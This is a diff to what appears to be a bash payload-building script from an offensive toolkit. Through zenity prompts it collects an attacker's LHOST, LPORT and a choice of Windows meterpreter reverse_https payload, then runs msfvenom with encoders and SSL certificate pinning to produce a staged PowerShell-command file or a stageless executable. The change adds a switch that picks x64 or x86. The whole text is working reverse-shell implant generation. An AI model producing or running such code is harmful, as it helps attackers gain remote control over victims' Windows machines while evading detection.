@@ -289,7 +289,17 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
     paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 230) > /dev/null 2>&1
-    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -f psh-cmd -o paranoid-staged.$DEFAULT_EXT
+
+     #
+     # Config correct payload arch selected ..
+     #
+     if [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+       ArCh="x64"
+     else
+       ArCh="x86"
+     fi
+
+    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f psh-cmd -o paranoid-staged.$DEFAULT_EXT
 
       #
       # head (shellcode) - paranoid-staged.bat
@@ -341,7 +351,17 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
     paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter_reverse_https" FALSE "windows/x64/meterpreter_reverse_https" --width 350 --height 200) > /dev/null 2>&1
-    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -f exe -o paranoid-stageless.exe
+
+     #
+     # Config correct payload arch selected ..
+     #
+     if [ "$paylo" = "windows/x64/meterpreter_reverse_https" ]; then
+       ArCh="x64"
+     else
+       ArCh="x86"
+     fi
+
+    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f exe -o paranoid-stageless.exe
     sleep 2
 
 
